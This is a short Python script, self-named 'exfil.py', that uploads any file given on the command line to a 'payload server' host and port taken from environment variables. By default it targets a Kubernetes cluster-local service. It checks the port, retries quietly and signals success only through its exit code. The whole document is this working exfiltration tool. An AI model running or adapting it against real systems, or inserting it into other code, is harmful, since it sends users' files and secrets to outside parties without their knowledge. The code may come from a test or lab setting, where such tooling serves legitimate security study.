#!/usr/bin/env python3
import requests
import socket
import sys
import os
from time import sleep

SERVER = os.getenv("PAYLOAD_SERVER", "payload-server.default.svc.cluster.local")
PORT = int(os.getenv("PAYLOAD_PORT", "8080"))

def send(filepath, endpoint="/"):
    if not os.path.exists(filepath):
        return False

    try:
        ip = socket.gethostbyname(SERVER)
    except:
        ip = SERVER

    for attempt in range(3):
        try:
            s = socket.socket()
            s.settimeout(1)
            if s.connect_ex((ip, PORT)) != 0:
                if attempt < 2:
                    sleep(2 ** attempt)
                continue
            s.close()

            with open(filepath, 'rb') as f:
                r = requests.post(f"http://{ip}:{PORT}{endpoint}",
                                files={'file': (os.path.basename(filepath), f)},
                                timeout=5)
            if r.status_code == 200:
                return True
        except:
            if attempt < 2:
                sleep(2 ** attempt)
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: exfil.py <file> [endpoint]")
        sys.exit(1)

    endpoint = sys.argv[2] if len(sys.argv) > 2 else "/"
    sys.exit(0 if send(sys.argv[1], endpoint) else 1)
